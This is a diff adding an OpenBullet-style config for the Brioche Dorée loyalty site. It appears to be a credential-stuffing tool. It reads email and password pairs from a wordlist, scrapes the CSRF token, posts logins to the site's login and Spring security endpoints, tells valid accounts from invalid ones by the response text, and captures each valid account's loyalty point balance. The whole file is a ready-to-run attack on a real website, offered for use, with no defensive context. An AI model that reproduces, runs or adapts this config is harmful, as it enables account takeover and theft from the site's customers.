@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Brioche Dorée ( Capture )",
+  "SuggestedBots": 10,
+  "LastModified": "2018-07-01T03:40:25.8927279+00:00",
+  "AdditionalInfo": "",
+  "Author": "Marine",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://www.briochedoree.fr" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.briochedoree.fr/ma-fidelite-gourmande" 
+  HEADER "origin: https://www.briochedoree.fr" 
+#CAPTURE_CSRF_TOKEN PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"CSRFToken\" value=\"" "\" />" Recursive=FALSE -> VAR "Token" "" "" 
+#LOGIN REQUEST POST "https://www.briochedoree.fr/ma-fidelite-gourmande/login.json" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&j_password=<PASS>&CSRFToken=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "cookie.allow: true" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.briochedoree.fr/ma-fidelite-gourmande" 
+  HEADER "origin: https://www.briochedoree.fr" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Votre login et/ou mot de passe est incorrect" 
+  KEYCHAIN Success OR 
+    KEY "{\"valid\":true,\"" 
+#SECURITY_CHECK REQUEST POST "https://www.briochedoree.fr/j_spring_security_check" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&j_password=<PASS>&CSRFToken=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.briochedoree.fr/ma-fidelite-gourmande" 
+  HEADER "origin: https://www.briochedoree.fr" 
+#CAPTURE_POINTS PARSE "<SOURCE>" LR "<span class=\"Header-fidLinkAmount\">" "points" Recursive=FALSE -> CAP "Points" "" "" 
